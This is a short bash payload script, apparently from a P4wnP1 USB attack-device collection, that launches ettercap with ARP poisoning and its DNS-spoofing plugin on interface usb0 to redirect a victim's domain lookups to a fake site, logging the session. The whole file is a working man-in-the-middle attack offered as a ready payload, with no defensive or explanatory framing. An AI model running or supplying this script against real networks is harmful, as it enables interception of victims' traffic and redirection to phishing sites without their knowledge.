#!/bin/bash
# payloads/network/dns_spoof_redirect.sh
######################################

### Description: DNS spoofing to redirect target domains to a fake site
### Requirements: ettercap or dnschef

PAYLOAD_NAME="dns_spoof_redirect"
LOG_DIR="/opt/p4wnp1/logs"

mkdir -p "$LOG_DIR"

pkill ettercap || true

# Using ettercap for DNS spoofing
ettercap -T -q -i usb0 -P dns_spoof -M arp:remote > "$LOG_DIR/${PAYLOAD_NAME}.log" 2>&1 &

sleep 1

echo "[+] DNS spoofing with ettercap active on usb0. Logs in $LOG_DIR/${PAYLOAD_NAME}.log"
exit 0
